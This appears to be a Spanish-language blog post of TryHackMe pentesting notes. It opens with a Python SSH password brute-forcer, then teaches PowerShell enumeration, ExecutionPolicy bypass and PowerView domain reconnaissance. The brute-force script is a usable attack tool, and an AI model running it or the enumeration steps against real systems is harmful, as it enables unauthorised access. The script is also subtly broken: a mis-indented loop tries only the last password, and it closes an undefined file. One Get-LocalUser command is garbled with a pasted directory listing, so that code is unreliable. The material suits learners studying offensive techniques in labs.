<span class="n">target</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Please enter target IP address: '</span><span class="p">))</span>
<span class="n">username</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Please enter username to bruteforce: '</span><span class="p">))</span>
<span class="n">password_file</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Please enter location of the password file: '</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">ssh_connect</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
	<span class="n">ssh</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SSHClient</span><span class="p">()</span>
	<span class="n">ssh</span><span class="p">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">ssh</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">,</span> <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span>
	<span class="k">except</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">AuthenticationException</span><span class="p">:</span>
		<span class="n">code</span> <span class="o">=</span> <span class="mi">1</span>
	<span class="n">ssh</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">return</span> <span class="n">code</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">password_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">'latin-1'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
	<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
		<span class="n">password</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>

	<span class="k">try</span><span class="p">:</span>
		<span class="n">response</span> <span class="o">=</span> <span class="n">ssh_connect</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

		<span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="s">'password found: '</span><span class="o">+</span> <span class="n">password</span><span class="p">)</span>
			<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
		<span class="k">elif</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="s">'no luck'</span><span class="p">)</span>
	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
	<span class="k">pass</span>

<span class="n">input_file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Como en cualquier ataque de fuerza bruta, se le pasa una dirección de un servidor, un username, una lista de candidatos y lleva a cabo, mediante un bucle for, una serie de intentos de logeos en baterias. Si hay un match se expone la contraseña y de lo contrario se ignora el candidato.</p>

<p><br /></p>

<h3 id="3-hacking-with-powershell">3. Hacking with PowerShell.</h3>

<p><strong>Intro</strong></p>

<p>En esta sección aprenderemos PowerShell y orientaremos la adquisición de conocimiento a aquello que nos interese saber como pentesters.</p>

<p><br /></p>

<p><strong>What is Powershell?</strong></p>

<p>PowerShell es el Windows Scripting Language y entorno de shell que está construido sobre el marco .NET.</p>

<p>Esto también permite que Powershell ejecute funciones .NET directamente desde su shell. La mayoría de los comandos de Powershell, llamados <em>cmdlets</em> están escritos en .NET. A diferencia de otros lenguajes de secuencias de comandos y entornos de shell, la salida de estos <em>cmdlets</em>  son objetos, lo que hace que Powershell esté algo orientado a objetos (como Java). Esto también significa que la ejecución de cmdlets le permite realizar acciones en el objeto de salida (lo que facilita pasar la salida de un <em>cmdlet</em>  a otro). </p>

<p>El nombre de un cmdlet corriente se representa mediante <em>Verb-Noun</em>; por ejemplo, el cmdlet  para listar comandos se llama Get-Command, para obtener ayuda de un comando, Get-Help &lt;comand&gt;.</p>

<p><br /></p>

<p><strong>Basic Powershell Commands</strong></p>

<p>Veámos, ahora que sabemos cómo funciona Poweshell dentro de Windows, algunos comandos básicos de Powershell.</p>

<ul>
  <li><em>Get-Help</em>:</li>
</ul>

<p>Ya sabemos del apartado anterior que Get-Help puede proporcionar ayuda sobre un <em>cmdlet</em>. Para obtener ayuda de un comando particular empleamos el siguiente comando:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Help</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Command</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Además, podemos tener ejmplos concretos de uso mediante el modificador <em>-examples</em>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912101305.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Get-Command</em>: Este comando lista todos los comandos disponibles que se ajusten a una serie de criterios (pattern matching), por ejemplo Get-Command &lt;Verb&gt;-* (Get-Command New-*) o Get-Command *-&lt;Noun&gt;.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912102246.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Object Manipulation</em>: Como ya comentábamos en la sección anterior, el output de un cmdlet es un objeto y como tal, PowerShell tiene funciones y herramientas que nos permiten manipular el output de un cmdlet con distintos propósitos (como mostrar la información por pantalla de forma distinta, pasar el output directamente a otro cmdlet como input, etc).</li>
</ul>

<table>
  <tbody>
    <tr>
      <td>La herramienta fundamental es el <em>pipeline</em> (</td>
      <td>), que nos permite pasar el output de un cmdlet como input sobre otro cmdlet tal y como ocurre en Linux, la principal diferencia es que en lugar de pasar texto como tal, lo que pasa es un objeto y esto puede conllevar algunas diferencias.</td>
    </tr>
  </tbody>
</table>

<p>Por ejemplo, sabemos que un objeto es una istancia de una clase que suele tener asociado atributos y métodos (funciones específicas del objeto), para ver estos detalles podemos utilizar el cmdlet <em>Get-Member</em>:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Command</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="nt">-MemberType</span><span class="w"> </span><span class="nx">Method</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912103853.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Creación de objetos</em>:</li>
</ul>

<p>Podemos emplear el término Select-Object para extraer propiedades de otros objetos y adherirlos a un objeto nuevo.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912110615.png" text-align="center" />
</div>

<p>Modificadores para extraer información particular.</p>

<ul>
  <li>first - obtiene el primer objeto x</li>
  <li>last - obtiene el último objeto x</li>
  <li>único - muestra los objetos únicos</li>
  <li>skip - salta x objetos</li>
</ul>

<p><br /></p>

<ul>
  <li><em>Filtrado de Objetos</em>: Para poder organizar el output de un comando en base a patrones tenemos el cmdlet <em>Where-Object</em>. El uso sería de la siguiente forma:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Verb-Noun</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">PropertyName</span><span class="w"> </span><span class="nt">-operator</span><span class="w"> </span><span class="nx">Value</span><span class="w">

</span><span class="n">Verb-Noun</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">PropertyName</span><span class="w"> </span><span class="nt">-operator</span><span class="w"> </span><span class="n">Value</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Donde <em>-operator</em> se encuentra una lista de los siguientes operadores:</p>

<ul>
  <li><em>-Contains</em>: si algún elemento del valor de la propiedad coincide exactamente con el valor especificado</li>
  <li><em>-EQ</em>: si el valor de la propiedad es el mismo que el valor especificado</li>
  <li><em>-GT</em>: si el valor de la propiedad es mayor que el valor especificado</li>
</ul>

<p>Por ejemplo:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912131622.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Ordenamiento de Objetos</em>:</li>
</ul>

<p>Podemos emplear el término <em>Sort-Object</em> para ordenar la información que emite un comando:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912132556.png" text-align="center" />
</div>

<p><br /></p>

<p>Veámos ahora una serie de ejemplos prácticos:</p>

<ul>
  <li><em>Búsqueda de ficheros</em>:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nx">interesting-file</span><span class="o">*</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<p>El comando anterior utiliza el comando <em>Get-ChildItem</em> para buscar un fichero, de forma recursiva que empiece por la cadena de caracteres “interesting-file” el asterisco simboliza que a esta cadena le puede seguir cualquier cosa y por último silencia errores:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912142603.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Lectura de contenidos de ficherlo</em>:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912151211.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Medir contenido de un fichero (Líneas)</em>:</li>
</ul>

<p>Emplearemos el siguiente comando:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Command</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">command.txt</span><span class="p">;</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nx">command.txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">Cmdlet</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Measure-Object</span><span class="w"> </span><span class="nt">-Line</span><span class="w">
</span></code></pre></div></div>

<p>En él, en primer lugar utilizamos el comando Get-Command para listar todos los Cmdlets, alias, funciones instalados en el sistema y los envíamos sobre un fichero para que queden organizados por líneas. Seguidamente, sacamos el contenido de dicho fichero y seleccionamos aquellas que contengan el término Cmdlet al menos una vez con Select-String y con Measure-Object contamos dichas líneas.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912154617.png" text-align="center" />
</div>

<ul>
  <li><em>MD5 Hash</em>:</li>
</ul>

<p>Para obtener el hash md5 de un fichero empleamos el siguiente comando:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-FileHash</span><span class="w"> </span><span class="nt">-Algorithm</span><span class="w"> </span><span class="nx">md5</span><span class="w"> </span><span class="o">.</span><span class="nx">\interesting-file.txt.txt</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912155232.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Para obtener el directorio actual</em>:</li>
</ul>

<p>Get-Location.</p>

<p><br /></p>

<ul>
  <li><em>HTTP-Request</em>:</li>
</ul>

<p>Invoke-WebRequest</p>

<p><br /></p>

<p><strong>Enumeration with Powershell</strong></p>

<p>Vamos a ver cómo podemos llevar a cabo una serie de enumeraciones dentro del dispositivo:</p>

<ul>
  <li><em>Usuarios</em>:</li>
</ul>

<p>Para ver cuántos usuarios están dentro del dispositivo utilizamos el comando <em>Get-LocalUser</em>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912171128.png" text-align="center" />
</div>

<p>Para obtener información sobre las distintas cuentas podemos emplear el término <em>Select</em>, concretamente si quieremos saber a qué usuario pertenece por ejemplo un SID ( User Security Identifier) concreto utilizamos el siguiente comando:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-LocalUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">1.Scripting.md</span><span class="w"> </span><span class="nx">2022-07-10-0.Scripting_for_pentesters.md</span><span class="w"> </span><span class="nx">4.Windows.md</span><span class="w"> </span><span class="nx">8-xVHv9MIY5l</span><span class="w"> </span><span class="nx">8-xVHv9MIY5l.rar</span><span class="w"> </span><span class="nx">a.out</span><span class="w"> </span><span class="nx">apuntes</span><span class="w"> </span><span class="nx">etchashes.txt</span><span class="w"> </span><span class="nx">file.sh</span><span class="w"> </span><span class="nx">first_task_hashes</span><span class="w"> </span><span class="nx">firsttaskhashes.zip</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nx">GitBasics.md</span><span class="w"> </span><span class="nx">idrsa.id_rsa</span><span class="w"> </span><span class="nx">idrsa.txt</span><span class="w"> </span><span class="nx">Jig_Of_Sorts.mp3</span><span class="w"> </span><span class="nx">Music</span><span class="w"> </span><span class="nx">Musica</span><span class="w"> </span><span class="nx">Musica2</span><span class="w"> </span><span class="nx">ntlm.txt</span><span class="w"> </span><span class="nx">passwd.txt</span><span class="w"> </span><span class="nx">qv1ntv5.ovpn</span><span class="w"> </span><span class="nx">rar.txt</span><span class="w"> </span><span class="nx">regulation.bin.bak</span><span class="w"> </span><span class="nx">Resident</span><span class="w"> </span><span class="nx">Evil</span><span class="w"> </span><span class="nx">5</span><span class="w"> </span><span class="nx">soundtrack</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Colors</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Mercenaries</span><span class="w"> </span><span class="nx">Menu</span><span class="w"> </span><span class="nx">Screen-_9bFKKIHQxA.mp4.part</span><span class="w"> </span><span class="nx">scriptApuntes.sh</span><span class="w"> </span><span class="nx">secure.rar</span><span class="w"> </span><span class="nx">secure.zip</span><span class="w"> </span><span class="nx">shadow.txt</span><span class="w"> </span><span class="nx">THM</span><span class="w"> </span><span class="nx">Tools</span><span class="w"> </span><span class="nx">TunnelingScripts</span><span class="w"> </span><span class="nx">unshadow.txt</span><span class="w"> </span><span class="nx">zippy</span><span class="w"> </span><span class="nx">zip.txt</span><span class="w"> </span><span class="nx">ZZ</span><span class="w"> </span><span class="nx">Top</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">La</span><span class="w"> </span><span class="nx">Grange-Vppbdf-qtGU</span><span class="w"> </span><span class="p">(</span><span class="n">online-audio-converter.com</span><span class="p">)</span><span class="o">.</span><span class="nf">mp3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">S-1-5-21-1394777289-3961777894-1791813945-501</span><span class="w">
</span></code></pre></div></div>

<p>Este lista los usuarios, obtiene sus especificacione y busca la línea correspondiente al patrón pasado como parámetro al cmdlet Select-String.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912171712.png" text-align="center" />
</div>

<p>O queremos saber cuántos usuarios no se les requiere contraseña:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912172015.png" text-align="center" />
</div>

<ul>
  <li><em>Grupos Locales</em>:</li>
</ul>

<p>Para saber cuántos grupos locales hay en el sistema utilizamos el comando <em>Get-LocalGroup</em>:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912172645.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li>
    <p><em>Networking Basic Info</em>:</p>
  </li>
  <li>
    <p><em>IP Info</em>: Empleamos el comando <em>Get-NetIPAddress</em>.</p>
  </li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912172925.png" text-align="center" />
</div>

<ul>
  <li><em>Port listening</em>: Para obtener puertos escuchando en el sistema empleamos el comando:</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-NetTCPConnection</span><span class="w"> </span><span class="nt">-State</span><span class="w"> </span><span class="nx">Listen</span><span class="p">,</span><span class="nx">Established</span><span class="w">
</span></code></pre></div></div>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912174105.png" text-align="center" />
</div>

<p>Si quisiéramos obtener información sobre una línea referente a un puerto concreto podemos pasar el output a un fichero para ordenar dicho output por líneas y de ahí extraer la línea que necesitamos filtrándo por puerto y luego borrando el fichero:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-NetTCPConnection</span><span class="w"> </span><span class="nt">-State</span><span class="w"> </span><span class="nx">Listen</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">file.txt</span><span class="p">;</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nx">file.txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-String</span><span class="w"> </span><span class="nx">445</span><span class="p">;</span><span class="w"> </span><span class="n">Remove-Item</span><span class="w"> </span><span class="nx">file.txt</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912174531.png" text-align="center" />
</div>

<ul>
  <li><em>Patches</em>: Para localizar parches o actualizaciones: Get-HotFix</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912174915.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912175159.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Backup files</em>: Los backups están dentro de ficheros con extensión “.bak”, así, lo que buscamos es un ficheor con dicha extensión:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912180239.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Process</em>: Para listar procesos empleamos <em>Get-Process</em>:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912181804.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Tareas Programadas</em>: Para ver las tareas programadas empleamos <em>Get-ScheduledTask</em></li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912182248.png" text-align="center" />
</div>

<p>Y para encontrar un parámetro concreto:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220912182456.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Basic Scripting</strong></p>

<p>Ahora que hemos ejecutado comandos de powershell, veámos cómo podemos ejecutar un script para poder realizar acciones más complejas. Los scripts de Powershell tienen la extensión <em>.ps1</em>. Para esto vamos a emplear el PowerShell ISE, el editor de textos de PowerShell.</p>

<p>Ahora, veámos un script de ejemplo, abrimos el script <em>listening-ports.ps1</em>:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$system_ports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-NetTCPConnection</span><span class="w"> </span><span class="nt">-State</span><span class="w"> </span><span class="nx">Listen</span><span class="w">

</span><span class="nv">$text_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\ports.txt</span><span class="w">

</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$port</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$text_port</span><span class="p">){</span><span class="w">

</span><span class="kr">if</span><span class="p">(</span><span class="nv">$port</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nv">$system_ports</span><span class="o">.</span><span class="nf">LocalPort</span><span class="p">){</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nv">$port</span><span class="w">

</span></code></pre></div></div>

<p>Este script sencillo lleva a cabo, línea a línea, los siguientes pasos:</p>

<ul>
  <li>Guarda en la variable <em>system_ports</em> el comando que lista todos los puertos que escuchen peticiones.</li>
  <li>Hace lo propio con la variable <em>text_port</em> en la que guarda el contenido del fichero port.txt del escritorio del administrador.</li>
  <li>Por último, implementa un bucle <em>foreach</em> en el que lee cada línea del fichero donde tiene listados los puertos y, si el puerto está escuchando entonces lo saca por pantalla.</li>
</ul>

<p><br /></p>

<h3 id="4-powershell-for-pentesters">4. PowerShell for Pentesters.</h3>

<p><strong>Manipulating files</strong></p>

<ul>
  <li><em>Start-Process</em>: Con <em>start-process</em> podemos iniciar un proceso o lo que es lo mismo ejecutar un binario, como por ejemplo: notepad.exe:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913181646.png" text-align="center" />
</div>

<ul>
  <li><em>Get-Process</em>: Útil para listar todos los procesos que se están ejecutando. Podemos adjuntar el modificador <em>-Name</em> para filtrar por un nombre específico.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913182013.png" text-align="center" />
</div>

<ul>
  <li><em>Get-Content</em>: Se utiliza para mostar el contenido de un fichero.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913182100.png" text-align="center" />
</div>

<ul>
  <li><em>Copy/Move/Remove-Item</em>: Para copiar, mover o borrar archivos siempre y cuando se tenga permiso para ello:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913182146.png" text-align="center" />
</div>

<ul>
  <li><em>Get-FileHash</em>: Para obtener el Hash del contenido de un fichero. Se ha de tener en cuenta que hay que especificar el algoritmo de hash:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913182412.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Downloading files</strong></p>

<p>Existen numerosas formas de descargar ficheros usando PowerShell, a través de un servidor de python:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">http.server</span><span class="w"> </span><span class="nx">8888</span><span class="w">
</span></code></pre></div></div>

<p>Y luego aplicando desde la máquina cliente el cmdlet <em>Invoke-WebRequest</em> o alguno similar</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913183152.png" text-align="center" />
</div>

<p>Se recomienda buscar en google formas de descargar ficheros en Powershell.</p>

<p>Una vez se ha descargado el fichero, conviene revisar el ExecutionPolicy mediante el cmdlet <em>Get-ExecutionPolicy -list</em> el cual lista una serie de reglas predefinidas para ejecutar binarios en el sistema, no se trata de una medida de seguridad y puede ser fácilmente bypasseado por el usuario como por ejemplo:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913183604.png" text-align="center" />
</div>

<p>Aunque algunos métodos requeriran de permisos de adminstrador.</p>

<p><br /></p>

<p><strong>System Reconnaissance</strong></p>

<p>Powershell tiene incorporados algunos scripts que permiten a un usuario realizar una tarea de reconocimiento en el sistema:</p>

<p><em>Get-HotFix</em>: Nos permite enumerar actualizaciones o parches de seguridad.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913184019.png" text-align="center" />
</div>

<p>Para mayor eficencia podemos combinar modificadores para adaptar el formato del output a una lista y luego filtrar el resultado con por ejemplo el comando:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-HotFix</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-list</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">pattern</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913184210.png" text-align="center" />
</div>

<p>Observemos que por defecto muchos cmdlet muestran con un formato tabla que no admite el filtrado de términos de forma cómoda. En este sentido es muy útil el cmd-let <em>Format-list</em>, otros ejemplos serían:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913184317.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913184324.png" text-align="center" />
</div>

<p>También podemos utilizar <em>Out-File</em> para enviar el output a un fichero.</p>

<p><br /></p>

<p><strong>Network Reconnaissance</strong></p>

<p>Con powershell podemos emplear comandos que puedan enviar un paquete ICMP (ping) a un rango de direcciones IP:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913184725.png" text-align="center" />
</div>

<p>Podemos optimizar este resultado enviando los errores a “null” añadiendo una redirección de error: <em>2&gt;$null</em> como hacíamos en Linux.</p>

<p><br /></p>

<p><strong>PowerView</strong></p>

<p>Powerview es uno de las formas más efectivas de recopilar información sobre el dominio. Este módulo puede ser descargado desde el siguiente <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">enlace</a> Recordamos que debemos de tener en cuenta el bypass de la ExecutionPolicy para ser capaz de ejecutar el script.</p>

<p>Powerview es un módulo que añade al entorno del usuario un conjunto de cmdlets que ayudan a la recopilación de información del sistema. Así, lo que hacemos es importar dichos comandos con el témrino Import-Module:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913185806.png" text-align="center" />
</div>

<p>De esta forma ya estaremos en disposición de utilizar los siguientes comandos:</p>

<ul>
  <li><em>Get-NetDomainController</em>: Este comando recopila información sobre el domain controller.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913185653.png" text-align="center" />
</div>

<ul>
  <li><em>Get-NetUser</em>: Este comando proporcionará una lista de <em>domain users</em>. El output puede ser complicado de leer, con lo que conviene filtrarlo o bien con <em>out-gridview</em> o por atributos:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913190016.png" text-align="center" />
</div>

<p>O directamente utilizar el <em>pipe</em> para filtar determinados términos o propiedades:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913190154.png" text-align="center" />
</div>

<ul>
  <li><em>Get-NetComputer</em>: Este comando sirve para enumerar sistemas contectados al dominio. Si añadimos le modificador <em>-ping</em> enumeraremos aquellos sistemas que están actualmente online.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913191802.png" text-align="center" />
</div>

<ul>
  <li><em>Get-NetGroup/Get-NetGroupMember</em>: Algunas cuentas son miembros de grupos importantes como el dominio de los administradores. El cmdlet Get-NetGroup puede ayudarnos a enumerar grupos existentes e información sobre los mismos:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913191908.png" text-align="center" />
</div>

<p>Podemos filtar términos para obtener una lista de todos los Grupos</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913192923.png" text-align="center" />
</div>

<p>Y seguidamente buscar información específica de un grupo o directamente listar los miembros de dicho grupo con Get-NetGroupMember:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913193031.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li><em>Finding Shares</em>:</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913193118.png" text-align="center" />
</div>

<ul>
  <li><em>Enumerate Group Policy</em>: La política de grupos se utiliza para configurar ordenadores conectados a un dominio. El cmdlet se emplea para <em>Get-NetGPO</em> para recopilar inforamción sobre políticas forzadas.</li>
</ul>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220913201404.png" text-align="center" />
</div>

<ul>
  <li><em>User Enumeration</em>: Saber que usuarios tienen privilegios de administrador puede facilitar la escalada lateral de privilegios.</li>
</ul>

<p>Para ello empleamos el cmdlet Find-LocalAdminAccess.</p>


      </article>

      
        <div class="blog-tags">
          <span>Tags:</span>
          
            <a href="/tags#thm">thm</a>
          
        </div>
      

      

      
        <!-- Check if any share-links are active -->




<section id = "social-share-section">
  <span class="sr-only">Share: </span>

  
    <a href="https://twitter.com/intent/tweet?text=0.Scripting+for+pentesters.&url=http%3A%2F%2Flocalhost%3A4000%2F2022-07-10-0.Scripting_for_pentesters%2F"
      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
      <span class="sr-only">Twitter</span>
    </a>
  

  
    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2022-07-10-0.Scripting_for_pentesters%2F"
      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
      <span class="sr-only">Facebook</span>
    </a>
  

  
    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2022-07-10-0.Scripting_for_pentesters%2F"
      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
